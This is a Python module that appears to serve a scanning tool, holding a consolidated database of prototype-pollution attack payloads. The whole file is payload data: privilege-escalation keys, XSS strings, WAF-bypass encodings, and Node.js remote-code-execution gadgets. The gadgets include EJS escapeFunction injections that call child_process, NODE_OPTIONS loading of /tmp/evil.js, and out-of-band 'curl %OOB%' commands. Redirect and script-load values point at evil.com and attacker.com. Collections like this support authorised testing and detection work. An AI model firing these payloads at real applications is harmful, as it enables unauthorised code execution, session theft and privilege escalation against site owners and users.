"""
Consolidated Prototype Pollution Payloads Database
Merged from: PayloadsAllTheThings, BlackFan/client-side-prototype-pollution,
KTH-LangSec/server-side-prototype-pollution, and PortSwigger research.

Sources:
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/BlackFan/client-side-prototype-pollution
- https://github.com/KTH-LangSec/server-side-prototype-pollution
- https://github.com/portswigger/server-side-prototype-pollution
- https://github.com/yeswehack/pp-finder
- https://github.com/msrkp/PPScan
"""

# ============================================================================
# CLIENT-SIDE PROTOTYPE POLLUTION PAYLOADS
# ============================================================================
CLIENT_SIDE_PP_PAYLOADS = {
    # jQuery $.extend() vulnerabilities (CVE-2019-11358 and similar)
    'jquery_extend': [
        {"__proto__": {"polluted": True}},
        {"__proto__": {"polluted": "yes"}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"admin": True}},
        {"__proto__": {"authenticated": True}},
        {"__proto__": {"debug": True}},
        {"__proto__": {"status": 555}},
        {"constructor": {"prototype": {"polluted": True}}},
        {"constructor": {"prototype": {"isAdmin": True}}},
    ],
    
    # Generic Object prototype pollution (JSON/direct)
    'object_prototype': [
        {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}},
        {"__proto__": {"src": "javascript:alert(1)"}},
        {"__proto__": {"href": "javascript:alert(1)"}},
        {"__proto__": {"onclick": "alert(1)"}},
        {"__proto__": {"onerror": "alert(1)"}},
        {"__proto__": {"onload": "alert(1)"}},
        {"__proto__": {"transport_url": "//evil.com/payload.js"}},
        {"__proto__": {"data": "<img src=x onerror=alert(1)>"}},
    ],
    
    # Constructor.prototype pollution
    'constructor_prototype': [
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"constructor": {"prototype": {"authenticated": True}}},
        {"constructor": {"prototype": {"admin": True}}},
        {"constructor": {"prototype": {"role": "administrator"}}},
        {"constructor": {"prototype": {"innerHTML": "<img src=x onerror=alert(1)>"}}},
    ],
    
    # URL-based payloads (for parameter injection)
    'url_params': [
        "__proto__[polluted]=true",
        "__proto__[isAdmin]=true",
        "__proto__[authenticated]=true",
        "constructor[prototype][polluted]=true",
        "constructor[prototype][isAdmin]=true",
        "__proto__.polluted=true",
        "__proto__.isAdmin=true",
        "a[__proto__][polluted]=true",
        "a.__proto__.polluted=true",
    ],
    
    # Nested property access patterns
    'nested_access': [
        "?a[b][__proto__][polluted]=true",
        "?foo[bar][__proto__][isAdmin]=true",
        "?x[y][z][__proto__][admin]=true",
        "?data[meta][__proto__][authenticated]=true",
    ],
    
    # Template injection gadgets
    'template_gadgets': [
        {"__proto__": {"template": "<img src=x onerror=alert(1)>"}},
        {"__proto__": {"views": "/"}},
        {"__proto__": {"openDelimiter": "{{"}},
        {"__proto__": {"closeDelimiter": "}}"}},
    ],
    
    # DOM node gadgets
    'dom_gadgets': [
        {"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}},
        {"__proto__": {"outerHTML": "<img src=x onerror=alert(document.domain)>"}},
        {"__proto__": {"body": "<img src=x onerror=alert(document.domain)>"}},
        {"__proto__": {"textContent": "polluted"}},
    ],
    
    # jQuery.extend variations
    'jquery_variations': [
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
        '{"foo": {"__proto__": {"polluted": true}}}',
        '{"__proto__": {"status": 200}}',
        '{"__proto__": {"headers": {"X-Polluted": "true"}}}',
    ],
    
    # Object.defineProperty Descriptor Pollution (PortSwigger research 2024)
    # When Object.defineProperty is used, the descriptor object inherits from Object.prototype
    # Polluting 'value', 'get', 'set', 'writable', 'configurable', 'enumerable' can bypass security
    'descriptor_pollution': [
        {"__proto__": {"value": "data:,alert(1)", "PPMAP_DESCRIPTOR": "polluted"}},  # Overwrites property values
        {"__proto__": {"value": "data:,alert(document.domain)//", "PPMAP_DESCRIPTOR": "polluted"}},
        {"__proto__": {"value": "javascript:alert(1)", "PPMAP_DESCRIPTOR": "polluted"}},
        {"__proto__": {"value": "//evil.com/xss.js", "PPMAP_DESCRIPTOR": "polluted"}},
        {"__proto__": {"writable": True, "PPMAP_DESCRIPTOR": "polluted"}},  # Makes non-writable properties writable
        {"__proto__": {"configurable": True, "PPMAP_DESCRIPTOR": "polluted"}},  # Makes non-configurable properties configurable
        {"__proto__": {"enumerable": True, "PPMAP_DESCRIPTOR": "polluted"}},  # Makes non-enumerable properties enumerable
    ],
    
    # URL-based descriptor pollution payloads
    'descriptor_pollution_url': [
        "?__proto__[value]=data:,alert(1)//",
        "?__proto__[value]=data:,alert(document.domain)//",
        "?__proto__[value]=javascript:alert(1)",
        "?__proto__[writable]=true",
        "?__proto__[configurable]=true",
        "?constructor[prototype][value]=data:,alert(1)//",
    ],
}

# ============================================================================
# SERVER-SIDE PROTOTYPE POLLUTION PAYLOADS (Node.js / Express / etc)
# ============================================================================
SERVER_SIDE_PP_PAYLOADS = {
    # Express.js specific
    'express': [
        '{"__proto__": {"parameterLimit": 1}}',
        '{"__proto__": {"ignoreQueryPrefix": true}}',
        '{"__proto__": {"allowDots": true}}',
        '{"__proto__": {"json spaces": " "}}',
        '{"__proto__": {"jsonp callback": "polluted"}}',
        '{"__proto__": {"query": {}}}',
    ],
    
    # Node.js core gadgets (RCE vectors)
    'nodejs_rce': [
        '{"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}}',
        '{"__proto__": {"NODE_OPTIONS": "--inspect=127.0.0.1:9229"}}',
        '{"__proto__": {"shell": "node"}}',
        '{"__proto__": {"argv0": "node"}}',
        '{"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/evil.js"}}}',
        '{"__proto__": {"execPath": "/bin/sh"}}',
    ],
    
    # EJS template engine (known gadget)
    'ejs_gadget': [
        '{"__proto__": {"client": 1}}',
        '{"__proto__": {"localsName": "locals"}}',
        '{"__proto__": {"escapeFunction": "JSON.stringify;process.mainModule.require(\'child_process\').exec(\'id\')"}}',
        '{"__proto__": {"filename": "/etc/passwd"}}',
    ],
    
    # Child_process execution
    'child_process': [
        '{"__proto__": {"shell": "/bin/bash"}}',
        '{"__proto__": {"execPath": "/bin/bash"}}',
    ],
    
    # CORS and security headers manipulation
    'cors_headers': [
        '{"__proto__": {"exposedHeaders": ["Authorization", "X-Total-Count"]}}',
        '{"__proto__": {"credentials": true}}',
        '{"__proto__": {"origin": "*"}}',
        '{"__proto__": {"Access-Control-Allow-Origin": "*"}}',
    ],
    
    # Response status manipulation
    'response_status': [
        '{"__proto__": {"status": 510}}',
        '{"__proto__": {"statusCode": 400}}',
        '{"__proto__": {"statusMessage": "Custom Message"}}',
    ],
    
    # Redirect/location manipulation
    'redirect': [
        '{"__proto__": {"location": "http://attacker.com"}}',
        '{"__proto__": {"redirect": "http://attacker.com"}}',
        '{"__proto__": {"url": "http://attacker.com"}}',
    ],
    
    # Logging and debugging gadgets
    'logging': [
        '{"__proto__": {"debug": true}}',
        '{"__proto__": {"verbose": true}}',
        '{"__proto__": {"logLevel": "debug"}}',
    ],

    # OOB / Blind RCE Gadgets (v4.0)
    'blind_oob': [
        '{"__proto__": {"shell": "curl %OOB%"}}',
        '{"__proto__": {"exec": "wget %OOB%"}}',
        '{"__proto__": {"execPath": "curl", "argv0": "%OOB%"}}',
        '{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": {"TEST": "console.log(require(\'child_process\').execSync(\'curl %OOB%\'))"}}}', 
    ],

    # Post-Nov 2024 Critical CVEs (HackerAI Feed)
    'recent_cves_2024_2025': [
        # CVE-2024-21529 (dset) - DoS/RCE via merge
        '{"__proto__": {"dset_exploit": true}}', 
        '{"__proto__": {"paths": ["/tmp/evil"]}}',
        # CVE-2024-33883 (EJS <3.1.10) - Template var pollution
        '{"__proto__": {"client": true, "escapeFunction": "JSON.stringify; process.mainModule.require(\'child_process\').execSync(\'id\')"}}',
        # CVE-2025-64718 (js-yaml) - YAML __proto__ tamper
        '!!js/hash:Object.prototype { polluted: true }', 
        '__proto__: !!js/hash:Object.prototype { x: y }',
        # CVE-2024-38999 (requirejs)
        '{"__proto__": {"context": {"config": {"packages": [{"name": "pkg", "main": "/tmp/evil.js"}]}}}}',
    ],

    # Advanced Server-Side Gadgets
    'advanced_ss_gadgets': [
        # NODE_OPTIONS Injection
        '{"__proto__": {"NODE_OPTIONS": "--inspect=0.0.0.0:1337"}}',
        '{"__proto__": {"NODE_OPTIONS": "--require ./"}}',
        # dotenv injection
        '{"__proto__": {"dotenv": {"loadSync": {"envPath": "/etc/passwd"}}}}',
        '{"__proto__": {"dotenv": {"config": {"path": "/proc/self/environ"}}}}',
        # tar/zip tools escalation
        '{"__proto__": {"uid": 0}}',
        '{"__proto__": {"gid": 0}}',
        '{"__proto__": {"preserveUid": true}}',
    ],
}

# ============================================================================
# COMBINED COMPREHENSIVE PAYLOADS
# ============================================================================
COMBINED_PP_PAYLOADS = {
    'basic_pollution': [
        {"__proto__": {"polluted": True}},
        {"__proto__": {"test": "vulnerable"}},
        {"constructor": {"prototype": {"polluted": True}}},
    ],
    
    'privilege_escalation': [
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"admin": True}},
        {"__proto__": {"authenticated": True}},
        {"__proto__": {"role": "administrator"}},
    ],
    
    'xss_gadgets': [
        {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}},
        {"__proto__": {"src": "javascript:alert(1)"}},
        {"__proto__": {"transport_url": "//evil.com/xss.js"}},
    ],
    
    'rce_gadgets': [
        {"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}},
        {"__proto__": {"shell": "/bin/bash"}},
    ],
}

# ============================================================================
# WAF BYPASS VARIATIONS
# ============================================================================
WAF_BYPASS_PAYLOADS = {
    'case_variation': [
        '{"__PROTO__": {"polluted": true}}',
        '{"__Proto__": {"polluted": true}}',
        '{"__PrOtO__": {"polluted": true}}',
        '{"CONSTRUCTOR": {"PROTOTYPE": {"polluted": true}}}',
        '{"Constructor": {"Prototype": {"polluted": true}}}',
    ],
    
    'encoding_bypass': [
        '__proto__%5B%70%6F%6C%6C%75%74%65%64%5D=true',  # URL encoded
        '__proto__\\u005B%70%6F%6C%6C%75%74%65%64\\u005D=true',  # Mixed
        '%5F%5Fproto%5F%5F%5Bpolluted%5D=true',  # Double encoded __proto__
    ],
    
    'unicode_bypass': [
        '{"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": true}}',
        '{"__proto\\u0000__": {"polluted": true}}',
    ],
    
    'special_chars_bypass': [
        '{"__proto__%00": {"polluted": true}}',  # Null byte
        '{"__proto__%09": {"polluted": true}}',  # Tab
        '{"__proto__%0A": {"polluted": true}}',  # Newline
    ],
    
    'advanced_bypass': [
        # From PayloadsAllTheThings & PortSwigger research
        '__proto__[test]=test',
        '__proto__.polluted=true',
        'a[__proto__][polluted]=true',
        'a.__proto__.polluted=true',
        'x.__proto__.edcbcab=edcbcab',
        '__proto__[eedffcb]=eedffcb',
        '__proto__.baaebfc=baaebfc',
        # Constructor variations
        'constructor[prototype][polluted]=true',
        'constructor.prototype.polluted=true',
        # URL hash variations
        '#a=b&__proto__[admin]=1',
        '#__proto__[xxx]=alert(1)',
        # Nested delegation gadgets
        '__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src onerror=alert(1)%3E',
        'a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)',
        # Property access variations
        '?__proto__[transport_url]=//evil.com/payload.js',
        '?__proto__[src]=javascript:alert(1)',
        '?__proto__[onerror]=alert(document.domain)',
        '?__proto__[innerHTML]=<img src=x onerror=alert(1)>',
        '??__proto__[polluted]=true',  # Double query separator
        '?&__proto__[polluted]=true',  # Ampersand prefix
        '?__proto__[polluted]=true&',  # Trailing ampersand
    ],
    
    'library_specific': [
        # qs library specific patterns
        '{"[__proto__]": {"polluted": true}}',
        '{"__proto__:": {"polluted": true}}',
        '{"__proto__[''"'': {"polluted": true}}',
        # express-query-parser patterns
        '{"__proto__[express]": "true"}',
        # Query string variations
        'name=value&__proto__[admin]=1',
        'name=value&__proto__.admin=1',
        # Case mixing for JavaScript parsers
        '__PROTO__[admin]=1',
        '__PrOtO__[admin]=1',
        '__pRoTo__[admin]=1',
        '__proto__[ADMIN]=1',
        '__proto__[Admin]=1',
        # Numeric key access
        '__proto__[0x61646d696e]=1',  # hex for 'admin'
        '__proto__[0o141144155151156]=1',  # octal for 'admin'
        # String concatenation tricks
        '__proto__["ad"+"min"]=1',
        '__proto__["ad".concat("min")]=1',
        # Array index tricks
        '__proto__[["admin"][0]]=1',
        # Spread operator tricks
        '{"...__proto__":{"polluted":true}}',
    ],
}

# ============================================================================
# FUNCTION.PROTOTYPE POLLUTION (Advanced Bypass - CVE-2021-44906 & Similar)
# ============================================================================
FUNCTION_PROTOTYPE_PAYLOADS = {
    'constructor_chain': [
        # Basic constructor.prototype chains
        {"constructor": {"prototype": {"polluted": True}}},
        {"constructor": {"prototype": {"vulnerable": True}}},
        {"constructor": {"prototype": {"admin": True}}},
        # Function.prototype via constructor.constructor
        {"__proto__": {"constructor": {"prototype": {"gadget": True}}}},
        {"constructor": {"constructor": {"prototype": {"polluted": True}}}},
        # Deep chains
        {"constructor": {"constructor": {"constructor": {"prototype": {"x": "y"}}}}},
        # Mixed with __proto__
        {"__proto__": {"constructor": {"constructor": {"prototype": {"test": True}}}}},
    ],
    
    'minimist_style': [
        # CVE-2021-44906 style payloads (minimist library)
        {"_.constructor.constructor.prototype.foo": "bar"},
        {"__proto__.constructor.constructor.prototype.exec": "bash"},
        {"constructor.constructor.prototype.shell": "/bin/bash"},
        # Nested array access
        {"a[\"constructor\"][\"constructor\"][\"prototype\"]": {"polluted": True}},
    ],
    
    'url_encoded_constructor': [
        # URL-based Function.prototype chains
        "?constructor[constructor][prototype][polluted]=true",
        "?constructor[constructor][prototype][admin]=yes",
        "?constructor.constructor.prototype.vulnerable=true",
        "?a[constructor][constructor][prototype][x]=y",
        "?__proto__[constructor][constructor][prototype][test]=value",
    ],
    
    'json_post_constructor': [
        '{"constructor": {"constructor": {"prototype": {"polluted": true}}}}',
        '{"__proto__": {"constructor": {"constructor": {"prototype": {"admin": true}}}}}',
        '{"a": {"constructor": {"prototype": {"gadget": "function_prototype"}}}}',
        '{"nested": {"deep": {"constructor": {"constructor": {"prototype": {"test": "vulnerable"}}}}}}',
    ],
    
    'prototype_manipulation': [
        # Direct prototype manipulation
        {"prototype": {"polluted": True}},
        {"prototype": {"admin": True}},
        {"__proto__": {"prototype": {"vulnerable": True}}},
        # Constructor.prototype variations
        {"constructor.prototype.admin": True},
        {"constructor.prototype.isAdmin": True},
        # Function constructor gadget
        {"__proto__": {"constructor": {"name": "Function"}}},
    ],
    
    'blind_detection_constructor': [
        # For blind server-side detection via constructor
        '{"__proto__": {"constructor": {"prototype": {"json spaces": 10}}}}',
        '{"constructor": {"constructor": {"prototype": {"status": 418}}}}',
        '{"constructor": {"prototype": {"exposedHeaders": ["admin"]}}}',
        # Lodash-style merge with constructor
        '{"constructor.prototype.isAdmin": "true"}',
    ],
}

# ============================================================================
# XSS PAYLOADS FOR COMBINED PP+XSS ATTACKS
# ============================================================================
XSS_PAYLOADS = [
    "<img src=x onerror='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<body onload='alert(\"XSS\")'>",
    "<input onfocus='alert(1)' autofocus>",
    "<marquee onstart='alert(1)'>",
    "<details open ontoggle='alert(1)'>",
    "<img src=x onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",  # base64 encoded alert(1)
]

# ============================================================================
# VERIFICATION/TESTING PAYLOADS
# ============================================================================
VERIFICATION_PAYLOADS = {
    'marker_based': [
        {"__proto__": {"test_marker_123": "vulnerable"}},
        {"__proto__": {"vuln_check": True}},
    ],
    
    'status_based': [
        {"__proto__": {"status": 555}},
        {"__proto__": {"customStatus": "polluted"}},
    ],
    
    'header_based': [
        {"__proto__": {"X-Test-Header": "polluted"}},
        {"__proto__": {"customHeader": "value"}},
    ],
}

# ============================================================================
# TIER 2: MODERN FRAMEWORKS - REACT 19/NEXT.JS & SVELTEKIT
# ============================================================================

# ============================================================================
# REACT 19 / NEXT.JS FLIGHT PROTOCOL (RESEARCH-2024-REACT-FLIGHT, RESEARCH-2024-NEXTJS-FLIGHT)
# ============================================================================
REACT_FLIGHT_PROTOCOL_PAYLOADS = {
    'flight_protocol_basic': [
        # Basic React Flight deserialization with constructor access
        '{"_formData": {"get": "$1:then:constructor"}}',
        '{"_formData": {"get": "constructor"}}',
        '{"then": {"constructor": {"constructor": {"prototype": {"x": "y"}}}}}',
        # Shadowed hasOwnProperty attacks
        '{"hasOwnProperty": {"constructor": {}}}',
        '{"hasOwnProperty": {"_proto": {"constructor": {}}}}',
    ],
    
    'flight_rce_gadgets': [
        # RCE via Function constructor in Flight payloads
        '{"_formData": {"get": "$1:then:constructor:constructor"}}',
        '{"fn": {"constructor": {"constructor": {"call": "process.mainModule.require"}}}}',
        '{"obj": {"then": {"constructor": {"constructor": {"apply": "eval"}}}}}',
        # Access to module system via constructor chains
        '{"prototype": {"constructor": {"prototype": {"mainModule": {"require": "child_process"}}}}}',
        '{"__proto__": {"constructor": {"constructor": {"prototype": {"moduleloader": "true"}}}}}',
    ],
    
    'flight_prototype_traversal': [
        # Direct prototype traversal (not strict PP, but related)
        '{"value": {"hasOwnProperty": {"constructor": {"prototype": {"polluted": "true"}}}}}',
        '{"key": {"__proto__": {"constructor": {"constructor": {"prototype": {"x": 1}}}}}}',
        '{"target": {"constructor": {"name": "Function"}}}',
        # Nested traversal patterns
        '{"nested": {"deep": {"chain": {"constructor": {"constructor": {"constructor": {"prototype": {}}}}}}}}}',
    ],
    
    'flight_charset_attacks': [
        # UTF-7/UTF-16 encoding bypass in Flight messages
        '{"encoding": "utf-7", "__proto__": {"polluted": "true"}}',
        '{"charset": "utf-16", "__proto__[admin]": "true"}',
        '{"content-type": "text/plain; charset=utf-7"}',
    ],
}

# ============================================================================
# SVELTEKIT / SUPERFORMS (RESEARCH-2024-SVELTEKIT-RCE)
# ============================================================================
SVELTEKIT_SUPERFORMS_PAYLOADS = {
    'superforms_pollution': [
        # SvelteKit superforms __superform_json and __superform_file patterns
        '{"__superform_json": "[{}]", "__superform_file___proto__": {"toString": "corrupted"}}',
        '{"__superform_files___proto__.path": "/bin/bash"}',
        '{"__superform_files___proto__.args": ["-c", "id"]}',
        '{"__superform_data___proto__.polluted": "true"}',
        # Direct prototype access via superforms keys
        '{"_superform___proto__[sendmail]": "/bin/sh"}',
        '{"__superform_root___proto__[execPath]": "/bin/bash"}',
    ],
    
    'devalue_deserialization': [
        # Devalue library PP (used by SvelteKit for serialization)
        '{"__proto__": 2}',  # Direct proto assignment
        '[{"x": 1, "__proto__": 2}, 3, {"polluted": "true"}]',  # Array-based proto pollution
        '{"prototype": {"constructor": {"prototype": {"polluted": "true"}}}}',
        # Escaped proto patterns for devalue parser
        '{"\\u005f\\u005f\\u0070\\u0072\\u006f\\u0074\\u006f\\u005f\\u005f": {}}',  # __proto__ unicode escaped
    ],
    
    'nodemailer_gadget': [
        # Exploit nodemailer sendmail integration
        '{"__proto__": {"path": "/bin/bash", "args": ["-c", "whoami"]}}',
        '{"__proto__": {"execPath": "/bin/sh", "shell": "/bin/bash"}}',
        '{"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/evil.js"}}}',
        # Form processing that reaches nodemailer
        '{"__superform_files___proto__.shell": "node"}',
        '{"__superform_json": {"__proto__": {"path": "/tmp/exploit"}}}',
    ],
    
    'sveltekit_formdata': [
        # SvelteKit FormData pollution
        '{"__formData": {"__proto__": {"polluted": "true"}}}',
        '{"form": {"__proto__": {"admin": "true"}}}',
        # Load function context pollution
        '{"locals": {"__proto__": {"authenticated": "true"}}}',
        '{"cookies": {"__proto__": {"session": "admin"}}}',
        # Page store pollution
        '{"$page": {"__proto__": {"data": {"admin": "true"}}}}',
    ],
}

# ============================================================================
# CHARSET OVERRIDE & ENCODING BYPASS
# ============================================================================
CHARSET_OVERRIDE_PAYLOADS = {
    'utf7_encoding': [
        # UTF-7 encoding triggers special parsing
        '{"__proto__": {"encoding": "utf-7", "PPMAP_CHARSET": "polluted"}}',
        '{"content-type": "text/html; charset=utf-7", "PPMAP_CHARSET": "polluted"}',
        '{"__proto__": {"charset": "utf-7", "polluted": "true", "PPMAP_CHARSET": "polluted"}}',
        # UTF-7 encoded payloads
        '+ACo-__proto__+ACo-+AD0-+ACo-admin+ACo-+AD0-true+ACY-PPMAP_CHARSET+AD0-polluted',  # "+ACo-" = +
    ],
    
    'iso_2022_bypass': [
        # ISO-2022 encoding can bypass filters
        '{"__proto__": {"encoding": "iso-2022-jp", "PPMAP_CHARSET": "polluted"}}',
        '{"__proto__": {"encoding": "iso-2022-kr", "PPMAP_CHARSET": "polluted"}}',
        '{"__proto__": {"_encoding": "iso-2022-cn", "PPMAP_CHARSET": "polluted"}}',
    ],
    
    'double_encoding': [
        # Double URL encoding to bypass filters
        '%25255f%25255f__proto__%25255f%25255f=polluted',
        '%252f__proto__%252f=true',
        # Double Unicode encoding
        '{"\\u005c\\u0075005f\\u005c\\u0075005f__proto__": "bypass"}',
    ],
    
    'header_injection_charset': [
        # Charset override via response headers
        '{"__proto__": {"Content-Type": "text/html; charset=utf-7"}}',
        '{"__proto__": {"Content-Encoding": "gzip, utf-7"}}',
        '{"__proto__": {"Accept-Charset": "utf-7, *"}}',
    ],
}

# ============================================================================
# HELPER FUNCTION FOR TIER 2 PAYLOADS
# ============================================================================
def get_all_tier2_payloads():
    """Return all Tier 2 (modern frameworks) payloads"""
    return {
        'react_flight': REACT_FLIGHT_PROTOCOL_PAYLOADS,
        'sveltekit_superforms': SVELTEKIT_SUPERFORMS_PAYLOADS,
        'charset_override': CHARSET_OVERRIDE_PAYLOADS,
    }

# ============================================================================


def get_all_payloads():
    """Return all available payloads (client-side)."""
    result = {}
    for category, payloads in CLIENT_SIDE_PP_PAYLOADS.items():
        result[category] = payloads
    return result


def get_server_side_payloads():
    """Return server-side specific payloads."""
    return SERVER_SIDE_PP_PAYLOADS


def get_waf_bypass_payloads():
    """Return WAF bypass variations."""
    return WAF_BYPASS_PAYLOADS


def get_function_prototype_payloads():
    """Return Function.prototype pollution payloads (advanced bypass techniques)."""
    return FUNCTION_PROTOTYPE_PAYLOADS


def get_tier2_payloads():
    """Return all Tier 2 (modern frameworks) payloads - React 19, Next.js, SvelteKit"""
    return get_all_tier2_payloads()


def get_react_flight_payloads():
    """Return React 19/Next.js Flight Protocol payloads (RESEARCH-2024-REACT-FLIGHT)"""
    return REACT_FLIGHT_PROTOCOL_PAYLOADS


def get_sveltekit_payloads():
    """Return SvelteKit/Superforms payloads (RESEARCH-2024-SVELTEKIT-RCE)"""
    return SVELTEKIT_SUPERFORMS_PAYLOADS


def get_charset_payloads():
    """Return charset override payloads for encoding bypass"""
    return CHARSET_OVERRIDE_PAYLOADS


def get_xss_payloads():
    """Return XSS payloads for chaining with PP."""
    return XSS_PAYLOADS


def payload_count():
    """Return total count of available payloads."""
    client_count = sum(len(p) for p in CLIENT_SIDE_PP_PAYLOADS.values())
    server_count = sum(len(p) for p in SERVER_SIDE_PP_PAYLOADS.values())
    waf_count = sum(len(p) for p in WAF_BYPASS_PAYLOADS.values())
    function_proto_count = sum(len(p) for p in FUNCTION_PROTOTYPE_PAYLOADS.values())
    react_flight_count = sum(len(p) for p in REACT_FLIGHT_PROTOCOL_PAYLOADS.values())
    sveltekit_count = sum(len(p) for p in SVELTEKIT_SUPERFORMS_PAYLOADS.values())
    charset_count = sum(len(p) for p in CHARSET_OVERRIDE_PAYLOADS.values())
    xss_count = len(XSS_PAYLOADS)
    return {
        'client_side': client_count,
        'server_side': server_count,
        'waf_bypass': waf_count,
        'function_prototype': function_proto_count,
        'react_flight': react_flight_count,
        'sveltekit': sveltekit_count,
        'charset_override': charset_count,
        'xss': xss_count,
        'total': (client_count + server_count + waf_count + function_proto_count + 
                 react_flight_count + sveltekit_count + charset_count + xss_count)
    }
